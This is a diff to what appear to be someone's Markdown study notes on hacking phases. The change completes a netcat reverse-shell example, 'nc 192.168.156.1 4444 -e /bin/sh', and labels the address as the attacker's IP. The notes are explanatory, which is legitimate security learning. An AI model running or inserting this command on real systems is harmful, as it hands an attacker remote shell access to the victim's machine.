@@ -125,9 +125,10 @@ Reverse shell is when the target connects to the attacker like this :
 nc -lvp 4444
 
 # Victim's machine
-nc }
+nc 192.168.156.1 4444 -e /bin/sh
 ```
 > l for listening, v for verbose, p for port
+> 192.168.156.1 is attacker's IP address
 ## Gaining Access
 ## Maintaining Access
 ## Covering Tracks
@@ -135,7 +136,7 @@ nc }
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIwOTYwNjkwNTYsMTgxODE3NjIxOSwtMT
+eyJoaXN0b3J5IjpbLTEzNTg3MDcyNjksMTgxODE3NjIxOSwtMT
 A5Nzg5MTgxMywyMDU0MTcwODU0LDE1MzQ2OTIyNTQsLTM2MzE2
 MjAwOSw0OTI4OTEzNTQsLTE0OTgyMzEwMSwxODY1NjIyODEwLC
 0yMDgxNDYzMjE0LC0xMDE4MzYyNjcsLTQ3NDk5MDk4OCwtMTQ3
